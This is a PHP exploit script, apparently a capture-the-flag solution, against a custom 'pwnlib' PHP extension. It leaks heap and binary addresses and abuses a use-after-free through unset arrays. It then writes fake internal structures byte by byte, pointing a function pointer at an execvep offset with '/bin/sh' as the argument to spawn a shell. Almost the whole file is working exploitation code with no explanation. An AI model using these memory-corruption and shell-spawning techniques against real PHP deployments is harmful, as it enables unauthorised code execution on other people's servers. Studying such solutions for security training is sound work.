<?php

# flag{if_you_get_this_flag_without_exploiting_the_bugs_in_the_php_extension_please_let_us_know_:p}

#
# <ptr> <0x307>
# <idx> <0>
#
# <0x0000001700000002> <0xfffffffe00000014>
# <ptr_to_indexes>      <0x0000000300000003>
# <0x8> <0x5> # not sure what this values are
# <fn_ptr>
#
#

# sleep(5);

$t0 = "aaaaaaaaaaaaaaaaaaaaaaaa";
$t1 = [0x11111111,0x22222222,0x33333333,0x44444444];

$l1 = pwnlib_hexdump($t0,48,8);
$l2 = pwnlib_hexdump($t0,80,8);
echo $l1;
echo "\n";
echo $l2;
echo "\n";
$hl = pwnlib_u64(hex2bin($l1));
echo $hl;
echo "\n";
$pb = pwnlib_u64(hex2bin($l2)) - 0x2b3100;
echo $pb;
echo "\n";

$dd1 = str_repeat('a',23);
$dd2 = str_repeat('a',23);
$dd3 = str_repeat('a',23);
$dd4 = str_repeat('a',23);
$dd5 = str_repeat('a',23);

$c = array(0 => 0x4142434445464748, 1 => 0x5152535455565758, 2 => 0x6162636465666768, 3 => 0x7172737475767778);

unset($c[2]);

$b = pwnlib_flat($c);
print_r($b);
unset($b);

pwnlib_flat($c);

$a1 = str_repeat('a',236);
$b1 = str_repeat('b',236);
$c1 = str_repeat('c',236);
$d1 = str_repeat('d',236);

$evp = $pb + 0x2495e4;
$evp_s = pwnlib_p64($evp);

$h307 = pwnlib_p64(0x307);
$h106 = pwnlib_p64(0x106);
$h1 = pwnlib_p64(1);
$h2 = pwnlib_p64(2);
$h3 = pwnlib_p64(3);
$h4 = pwnlib_p64(4);
$hb1 = pwnlib_p64($hl + 0x658);
$hb1_off = pwnlib_p64($hl + 0x3d8 + 0x40);

$stderr_addr = pwnlib_p64(0x800dc8+$pb);

$v1 = pwnlib_p64(0x0000001700000002);
$v2_0 = pwnlib_p32(0x00000014);
$v2_1 = pwnlib_p32(-2);
$v3 = pwnlib_p64($hl + 0x658 + 0x40);
$v4 = pwnlib_p64(0x0000000200000002);
$v5 = pwnlib_p64(8);
$v6 = pwnlib_p64(5);
$v7 = pwnlib_p64($pb + 0x2495e4); # execvep offset
$zero = pwnlib_p64(0);

$a1[0x0] = $zero[0];
$a1[0x1] = $zero[1];
$a1[0x2] = $zero[2];
$a1[0x3] = $zero[3];
$a1[0x4] = $zero[4];
$a1[0x5] = $zero[5];
$a1[0x6] = $zero[6];
$a1[0x7] = $zero[7];

# code to get libc leak, but we don't need it due to execvep in php
# $a1[0x10] = $stderr_addr[0];
# $a1[0x11] = $stderr_addr[1];
# $a1[0x12] = $stderr_addr[2];
# $a1[0x13] = $stderr_addr[3];
# $a1[0x14] = $stderr_addr[4];
# $a1[0x15] = $stderr_addr[5];
# $a1[0x16] = $stderr_addr[6];
# $a1[0x17] = $stderr_addr[7];
# $a1[0x18] = $h106[0];
# $a1[0x19] = $h106[1];
# $a1[0x1a] = $h106[2];
# $a1[0x1b] = $h106[3];
# $a1[0x1c] = $h106[4];
# $a1[0x1d] = $h106[5];
# $a1[0x1e] = $h106[6];
# $a1[0x1f] = $h106[7];
# $a1[0x20] = $h1[0];
# $a1[0x21] = $h1[1];
# $a1[0x22] = $h1[2];
# $a1[0x23] = $h1[3];
# $a1[0x24] = $h1[4];
# $a1[0x25] = $h1[5];
# $a1[0x26] = $h1[6];
# $a1[0x27] = $h1[7];
# $a1[0x28] = $zero[0];
# $a1[0x29] = $zero[0];
# $a1[0x2a] = $zero[0];
# $a1[0x2b] = $zero[0];
# $a1[0x2c] = $zero[0];
# $a1[0x2d] = $zero[0];
# $a1[0x2e] = $zero[0];
# $a1[0x2f] = $zero[0];
#
# $libcbase = pwnlib_u64(hex2bin(pwnlib_hexdump($c[1],0,8))) - 0x3ec680;
# echo $libcbase;

$a1[0x10] = $hb1[0];
$a1[0x11] = $hb1[1];
$a1[0x12] = $hb1[2];
$a1[0x13] = $hb1[3];
$a1[0x14] = $hb1[4];
$a1[0x15] = $hb1[5];
$a1[0x16] = $hb1[6];
$a1[0x17] = $hb1[7];
$a1[0x18] = $h307[0];
$a1[0x19] = $h307[1];
$a1[0x1a] = $h307[2];
$a1[0x1b] = $h307[3];
$a1[0x1c] = $h307[4];
$a1[0x1d] = $h307[5];
$a1[0x1e] = $h307[6];
$a1[0x1f] = $h307[7];
$a1[0x20] = $h1[0];
$a1[0x21] = $h1[1];
$a1[0x22] = $h1[2];
$a1[0x23] = $h1[3];
$a1[0x24] = $h1[4];
$a1[0x25] = $h1[5];
$a1[0x26] = $h1[6];
$a1[0x27] = $h1[7];
$a1[0x28] = $zero[0];
$a1[0x29] = $zero[0];
$a1[0x2a] = $zero[0];
$a1[0x2b] = $zero[0];
$a1[0x2c] = $zero[0];
$a1[0x2d] = $zero[0];
$a1[0x2e] = $zero[0];
$a1[0x2f] = $zero[0];

$a1[0x30] = $hb1[0];
$a1[0x31] = $hb1[1];
$a1[0x32] = $hb1[2];
$a1[0x33] = $hb1[3];
$a1[0x34] = $hb1[4];
$a1[0x35] = $hb1[5];
$a1[0x36] = $hb1[6];
$a1[0x37] = $hb1[7];
$a1[0x38] = $h307[0];
$a1[0x39] = $h307[1];
$a1[0x3a] = $h307[2];
$a1[0x3b] = $h307[3];
$a1[0x3c] = $h307[4];
$a1[0x3d] = $h307[5];
$a1[0x3e] = $h307[6];
$a1[0x3f] = $h307[7];
$a1[0x40] = $h2[0];
$a1[0x41] = $h2[1];
$a1[0x42] = $h2[2];
$a1[0x43] = $h2[3];
$a1[0x44] = $h2[4];
$a1[0x45] = $h2[5];
$a1[0x46] = $h2[6];
$a1[0x47] = $h2[7];
$a1[0x48] = $zero[0];
$a1[0x49] = $zero[0];
$a1[0x4a] = $zero[0];
$a1[0x4b] = $zero[0];
$a1[0x4c] = $zero[0];
$a1[0x4d] = $zero[0];
$a1[0x4e] = $zero[0];
$a1[0x4f] = $zero[0];

$a1[0x50] = $hb1[0];
$a1[0x51] = $hb1[1];
$a1[0x52] = $hb1[2];
$a1[0x53] = $hb1[3];
$a1[0x54] = $hb1[4];
$a1[0x55] = $hb1[5];
$a1[0x56] = $hb1[6];
$a1[0x57] = $hb1[7];
$a1[0x58] = $h307[0];
$a1[0x59] = $h307[1];
$a1[0x5a] = $h307[2];
$a1[0x5b] = $h307[3];
$a1[0x5c] = $h307[4];
$a1[0x5d] = $h307[5];
$a1[0x5e] = $h307[6];
$a1[0x5f] = $h307[7];
$a1[0x60] = $h3[0];
$a1[0x61] = $h3[1];
$a1[0x62] = $h3[2];
$a1[0x63] = $h3[3];
$a1[0x64] = $h3[4];
$a1[0x65] = $h3[5];
$a1[0x66] = $h3[6];
$a1[0x67] = $h3[7];
$a1[0x68] = $zero[0];
$a1[0x69] = $zero[0];
$a1[0x6a] = $zero[0];
$a1[0x6b] = $zero[0];
$a1[0x6c] = $zero[0];
$a1[0x6d] = $zero[0];
$a1[0x6e] = $zero[0];
$a1[0x6f] = $zero[0];

$b1[0x08] = $v1[0];
$b1[0x09] = $v1[1];
$b1[0x0a] = $v1[2];
$b1[0x0b] = $v1[3];
$b1[0x0c] = $v1[4];
$b1[0x0d] = $v1[5];
$b1[0x0e] = $v1[6];
$b1[0x0f] = $v1[7];
$b1[0x10] = $v2_0[0];
$b1[0x11] = $v2_0[1];
$b1[0x12] = $v2_0[2];
$b1[0x13] = $v2_0[3];
$b1[0x14] = $v2_1[0];
$b1[0x15] = $v2_1[1];
$b1[0x16] = $v2_1[2];
$b1[0x17] = $v2_1[3];
$b1[0x18] = $v3[0];
$b1[0x19] = $v3[1];
$b1[0x1a] = $v3[2];
$b1[0x1b] = $v3[3];
$b1[0x1c] = $v3[4];
$b1[0x1d] = $v3[5];
$b1[0x1e] = $v3[6];
$b1[0x1f] = $v3[7];
$b1[0x20] = $v4[0];
$b1[0x21] = $v4[1];
$b1[0x22] = $v4[2];
$b1[0x23] = $v4[3];
$b1[0x24] = $v4[4];
$b1[0x25] = $v4[5];
$b1[0x26] = $v4[6];
$b1[0x27] = $v4[7];
$b1[0x28] = $v5[0];
$b1[0x29] = $v5[1];
$b1[0x2a] = $v5[2];
$b1[0x2b] = $v5[3];
$b1[0x2c] = $v5[4];
$b1[0x2d] = $v5[5];
$b1[0x2e] = $v5[6];
$b1[0x2f] = $v5[7];
$b1[0x30] = $v6[0];
$b1[0x31] = $v6[1];
$b1[0x32] = $v6[2];
$b1[0x33] = $v6[3];
$b1[0x34] = $v6[4];
$b1[0x35] = $v6[5];
$b1[0x36] = $v6[6];
$b1[0x37] = $v6[7];
$b1[0x38] = $v7[0];
$b1[0x39] = $v7[1];
$b1[0x3a] = $v7[2];
$b1[0x3b] = $v7[3];
$b1[0x3c] = $v7[4];
$b1[0x3d] = $v7[5];
$b1[0x3e] = $v7[6];
$b1[0x3f] = $v7[7];

$b1[0x40] = 'a';
$b1[0x41] = 'b';
$b1[0x42] = 'c';
$b1[0x43] = 'd';
$b1[0x44] = 'e';
$b1[0x45] = 'f';
$b1[0x46] = 'g';
$b1[0x47] = 'h';

$b1[0x48] = '/';
$b1[0x49] = 'b';
$b1[0x4a] = 'i';
$b1[0x4b] = 'n';
$b1[0x4c] = '/';
$b1[0x4d] = 's';
$b1[0x4e] = 'h';
$b1[0x4f] = $zero[7];
$b1[0x50] = $h4[0];
$b1[0x51] = $h4[1];
$b1[0x52] = $h4[2];
$b1[0x53] = $h4[3];
$b1[0x54] = $h4[4];
$b1[0x55] = $h4[5];
$b1[0x56] = $h4[6];
$b1[0x57] = $h4[7];
$b1[0x58] = $zero[0];
$b1[0x59] = $zero[1];
$b1[0x5a] = $zero[2];
$b1[0x5b] = $zero[3];
$b1[0x5c] = $zero[4];
$b1[0x5d] = $zero[5];
$b1[0x5e] = $zero[6];
$b1[0x5f] = $zero[7];
$b1[0x60] = $zero[0];
$b1[0x61] = $zero[0];
$b1[0x62] = $zero[0];
$b1[0x63] = $zero[0];
$b1[0x64] = $zero[0];
$b1[0x65] = $zero[0];
$b1[0x66] = $zero[0];
$b1[0x67] = $zero[0];

unset($dd1);
unset($dd2);
unset($dd3);
unset($dd4);
unset($dd5);
# $d1 = str_repeat('d',236);
# $dd = &$c[1];
# print_r($dd);
pwnlib_flat($c[1]);
# unset($c);
$c[1][0] = 0x4142;

# while(true);
?>
